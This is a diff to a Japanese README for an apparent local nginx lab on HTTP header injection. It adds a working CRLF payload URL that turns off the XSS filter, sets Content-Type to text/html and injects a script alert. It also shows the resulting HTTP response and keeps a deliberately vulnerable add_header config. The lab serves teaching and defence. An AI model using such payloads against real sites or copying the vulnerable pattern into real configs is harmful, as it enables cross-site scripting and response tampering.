@@ -16,18 +16,48 @@ docker-compose up
 
 ### 攻撃
 
-攻撃を行う前に、以下の準備を行ってください。
+1. 以下のURLにアクセスします: `http://localhost/v1/see%0d%0aX-XSS-Protection:%200%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E.json`
+2. インジェクションによるJavaScriptのalertダイアログが上がってきます。
 
-* ブラウザに保存されたクッキーのうち、ホスト `127.0.0.1` の分をクリアしておく。
+この攻撃では、改行や特殊文字を解釈して示すと、以下の内容をHTTPヘッダインジェクションしていることになります。
 
-具体的な攻撃の手順は以下の通りです。
+```
+see
+X-XSS-Protection: 0
+Content-Type: text/html
 
-1. `http://127.0.0.1/v1/test%0d%0aSet-Cookie:%20TESTCOOKIE1=yes.json"` をブラウザのURLに指定し、アクセスする。
-2. 実行された結果、"OK"という文字列のみが表示される。
-3. ブラウザで、ホスト`127.0.0.1`に対するCookieの中身を見ると、クッキー`TESTCOOKIE1`に対し`yes`という値が設定されている。 
-4. `http://127.0.0.1/v1/test%0d%0aSet-Cookie:%20TESTCOOKIE2=testvalue.json"` をブラウザのURLに指定し、アクセスする。
-5. 実行された結果、"OK"という文字列のみが表示される。
-6. ブラウザで、ホスト`127.0.0.1`に対するCookieの中身を見ると、クッキー`TESTCOOKIE2`に対し`testvalue`という値が設定されている。 
+<script>alert(1)</script>.json
+```
+
+この攻撃の効果としては以下を意図しています。
+
+* 最初の `see` は `X-Action: see` として出力される（攻撃としての効果はない）
+* `X-XSS-Protection: 0` とすることでブラウザのXSSフィルタを無効化する
+* `Content-Type: text/html` とすることで `<script>` タグによるXSSを使えるようになる
+
+実際のHTTPでの返答例は次のようになります。
+
+```
+HTTP/1.1 200 OK
+Server: nginx/1.15.5
+Date: Wed, 31 Oct 2018 23:45:04 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 64
+Connection: keep-alive
+X-Action: see
+X-XSS-Protection: 0
+Content-Type: text/html
+
+<script>alert(1)</script>
+
+{"comment": "This is v1 endpoint.",
+```
+
+なお、`Content-Length: 64` となっているのは、nginx.confのreturnで返す以下の内容が64文字になっているためです。インジェクションによってこのJSONの返答の内容の前にヘッダが追加されるため、その分後から切り詰められています。
+
+```
+{"comment": "This is v1 endpoint.", "url": "http://example.com"}
+```
 
 ### 攻撃の対策
 
@@ -37,7 +67,7 @@ docker-compose up
         location ~ /v1/((?<action>[^.]*)\.json)?$ {
             # inject received content
             add_header X-Action $action;
-            return 200 "OK";
+            return 200 '{"comment": "This is v1 endpoint.", "url": "http://example.com"}';
         }
 ```
 
